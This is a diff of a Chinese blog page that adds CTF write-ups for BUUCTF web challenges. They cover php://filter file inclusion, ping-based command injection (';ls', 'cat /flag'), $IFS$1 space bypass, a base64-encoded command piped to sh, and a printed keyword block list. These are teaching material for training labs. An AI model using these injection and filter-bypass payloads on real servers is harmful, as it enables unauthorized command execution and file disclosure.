@@ -43,7 +43,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
 <meta property="article:published_time" content="2022-11-11T08:25:44.000Z">
-<meta property="article:modified_time" content="2022-11-11T13:39:31.671Z">
+<meta property="article:modified_time" content="2022-11-13T06:31:44.569Z">
 <meta property="article:author" content="Chen">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
@@ -1626,7 +1626,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: "env",
     cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1668216160077),
+    lastupdate: new Date(1668324924001),
     sidebar: {
       for_page: ["blogger","category","tagcloud","text"],
       for_post: ["toc"],
@@ -2475,6 +2475,103 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=source.php?../../../../../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
 
 <p>..&#x2F;可以多用几个 只要超过了ffffllllaaaagggg对应的子目录</p>
+<h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>f12查看页面源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">       <span class="variable">$cat</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cat&#x27;</span>];</span><br><span class="line">       <span class="keyword">echo</span> <span class="variable">$cat</span>;</span><br><span class="line">       <span class="keyword">if</span>(<span class="variable">$cat</span>==<span class="string">&#x27;dog&#x27;</span>)&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;Syc&#123;cat_cat_cat_cat&#125;&#x27;</span>;</span><br><span class="line">       &#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>当cat &#x3D; dog的时候输出flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = cat=dog</span><br></pre></td></tr></table></figure>
+
+<p>这题比较简单</p>
+<h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p>题目直接明说了flag文件的地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=flag.php</span><br></pre></td></tr></table></figure>
+
+<p>但是我们并没有看到flag</p>
+<p>推测flag应该是在源代码中</p>
+<p>这里可以利用php:&#x2F;&#x2F;filter伪协议来查看源代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://<span class="built_in">filter</span>/convert.base64-encode/resource=flag.php <span class="comment">#这题payload</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?xxx=php://<span class="built_in">filter</span>/convert.base64-encode/resource=xxx.php  <span class="comment">#协议格式</span></span><br></pre></td></tr></table></figure>
+
+<p>得到了base64编码的flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7NThjOWJmYWEtOThjOC00YTAyLWE3OTUtOTQyNzk1NTg2NDZjfQo=</span><br></pre></td></tr></table></figure>
+
+<p>解码后得到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;Can you find out the flag?&quot;;</span><br><span class="line">//flag&#123;58c9bfaa-98c8-4a02-a795-94279558646c&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="php-x2F-x2F-filter伪协议"><a href="#php-x2F-x2F-filter伪协议" class="headerlink" title="php:&#x2F;&#x2F;filter伪协议"></a>php:&#x2F;&#x2F;filter伪协议</h3><p>作用：php:&#x2F;&#x2F;filter可以获取指定文件源码。当其与文件包含函数结合时，php:&#x2F;&#x2F;filter流会被当作php文件执行。所以我们一般对其进行编码，阻止其不执行，从而读取任意文件源代码。</p>
+<p>详细解释：<a target="_blank" rel="noopener" href="https://blog.csdn.net/woshilnp/article/details/117266628">https://blog.csdn.net/woshilnp/article/details/117266628</a></p>
+<h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><p>靶机打开后显示</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/zFaJkd"><img src="https://s1.ax1x.com/2022/11/13/zFaJkd.png" class="lazyload" data-srcset="https://s1.ax1x.com/2022/11/13/zFaJkd.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="zFaJkd.png"></a></p>
+<p>ping一下本地ip试试</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/zFatfI"><img src="https://s1.ax1x.com/2022/11/13/zFatfI.png" class="lazyload" data-srcset="https://s1.ax1x.com/2022/11/13/zFatfI.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="zFatfI.png"></a></p>
+<p>有回显 再输一次 127.0.0.1;ls</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br><span class="line">index.php</span><br></pre></td></tr></table></figure>
+
+<p>flag应该在别的目录</p>
+<p>127.0.0.1;pwd</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br><span class="line">/var/www/html</span><br></pre></td></tr></table></figure>
+
+<p>cd &#x2F;查看一下根目录下所有文件 （其实直接find -name flag就好了，但是对方的docker可能没有拷find进去）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flag</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br></pre></td></tr></table></figure>
+
+<p>看到flag了 但是这里要注意下我们直接cat flag的话 目录并不是根目录</p>
+<p>所以这里 cat &#x2F;flag</p>
+<h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>这题属于是上一题的升级了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip= </span><br></pre></td></tr></table></figure>
+
+<p>页面显示只有这个</p>
+<p>有了上一题的经验 这里直接ip&#x3D;127.0.0.1;ls看一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br><span class="line">flag.php</span><br><span class="line">index.php</span><br></pre></td></tr></table></figure>
+
+<p>有一个flag.php</p>
+<p>cat一下试试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip= fxck your space!</span><br></pre></td></tr></table></figure>
+
+<p>空格被屏蔽了 猜测是空格绕过 用到$IFS$1</p>
+<p>ip&#x3D;127.0.0.1;cat$IFS$1flag.php试一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip= fxck your flag!</span><br></pre></td></tr></table></figure>
+
+<p>又被屏蔽了？看一下index.php 究竟屏蔽了哪些关键词</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">|\<span class="string">&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span></span><br><span class="line"><span class="string">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span></span><br><span class="line"><span class="string">    die(&quot;fxck your symbol!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your space!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your bash!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your flag!&quot;);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span></span><br><span class="line"><span class="string">  echo &quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;;</span></span><br><span class="line"><span class="string">  print_r($a);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>flag被屏蔽了 空格也被屏蔽了 base和其他的一些小字符也被屏蔽了</p>
+<p>不妨试试编码绕过关键词</p>
+<p>我们想要让系统执行的是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat$IFS$1flag.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Y2F0JElGUyQxZmxhZy5waHA= <span class="comment">//base64后</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo$IFS$1Y2F0JElGUyQxZmxhZy5waHA=|base64$IFS$1-d|sh  </span><br></pre></td></tr></table></figure>
+
+<p>但是我们仍然没有看到flag 查看一下页面源代码 发现flag被注释了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">&lt;pre&gt;PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br><span class="line">&lt;?php</span><br><span class="line">$flag = &quot;flag&#123;df216e35-445a-444f-ab34-dbfd7735c860&#125;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>尝试一下第二种办法 因为我们发现index.php中有一个变量$a 我们给他赋值g</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">&lt;pre&gt;PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br><span class="line">&lt;?php</span><br><span class="line">$flag = &quot;flag&#123;df216e35-445a-444f-ab34-dbfd7735c860&#125;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>同样可以显示出来</p>
+<h3 id="IFS"><a href="#IFS" class="headerlink" title="$IFS$"></a>$IFS$</h3><p>IFS默认是空字符(空格Space、Tab、换行\n)，把相邻的连续的分割符合并到了一起</p>
+<p>看一下下面两个例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string1=&quot;1 2 3 4&quot;</span><br><span class="line">echo $string1</span><br><span class="line">echo &quot;$string1&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 2 3 4</span><br><span class="line">1 2 3 4</span><br></pre></td></tr></table></figure>
+
+<p>这种情况下 二者输出是一样的</p>
+<p>如果我们多增加一个空格呢</p>
+<p>IFS就会将其合并后输出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string2=&quot;1  2  3  4&quot;</span><br><span class="line">echo $string2</span><br><span class="line">echo &quot;$string2&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 2 3 4</span><br><span class="line">1  2  3  4</span><br></pre></td></tr></table></figure>
+
+<p>如果判断是IFS的效果</p>
+<p>我们对IFS定义一下再看效果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">IFS=&#x27;-&#x27;</span><br><span class="line">string2=&quot;1  2  3  4&quot;</span><br><span class="line">echo $string2</span><br><span class="line">echo &quot;$string2&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1  2  3  4</span><br><span class="line">1  2  3  4</span><br></pre></td></tr></table></figure>
+
+<p>“ “相当于就是屏蔽了IFS</p>
 
   </div>
   
@@ -2499,10 +2596,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-11-11T21:39:31+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-11-13T14:31:44+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Nov 11, 2022</p>
+    <p>更新于：Nov 13, 2022</p>
   </a>
 </div>
 
@@ -2651,7 +2748,7 @@ ida打开 主函数应该是vul 跟进看一下
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL"><span class="toc-text">[极客大挑战 2019]EasySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HCTF-2018-WarmUp"><span class="toc-text">[HCTF 2018]WarmUp</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL"><span class="toc-text">[极客大挑战 2019]EasySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HCTF-2018-WarmUp"><span class="toc-text">[HCTF 2018]WarmUp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun"><span class="toc-text">[极客大挑战 2019]Havefun</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include"><span class="toc-text">[ACTF2020 新生赛]Include</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php-x2F-x2F-filter%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">php:&#x2F;&#x2F;filter伪协议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec"><span class="toc-text">[ACTF2020 新生赛]Exec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="toc-text">[GXYCTF2019]Ping Ping Ping</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IFS"><span class="toc-text">$IFS$</span></a></li></ol></li></ol>
     </div>
   </section>
 
@@ -3225,7 +3322,7 @@ ida打开 主函数应该是vul 跟进看一下
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"ChenBlog"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Chen"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/web/","name":"web"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2022/11/11/buu刷题记录/","name":"buu刷题记录"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Chen","url":"http://example.com/","keywords":null,"description":"ChenBlog","author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"ChenBlog"},"publisher":{"@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"buu刷题记录","description":"ChenBlog","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2022/11/11/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"},"author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Chen","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2022/11/11/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/","wordCount":0,"datePublished":"2022-11-11T08:25:44.000Z","dateModified":"2022-11-11T13:39:31.671Z","articleSection":"web","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"ChenBlog"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Chen"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/web/","name":"web"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2022/11/11/buu刷题记录/","name":"buu刷题记录"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Chen","url":"http://example.com/","keywords":null,"description":"ChenBlog","author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"ChenBlog"},"publisher":{"@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"buu刷题记录","description":"ChenBlog","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2022/11/11/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"},"author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Chen","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2022/11/11/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/","wordCount":0,"datePublished":"2022-11-11T08:25:44.000Z","dateModified":"2022-11-13T06:31:44.569Z","articleSection":"web","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
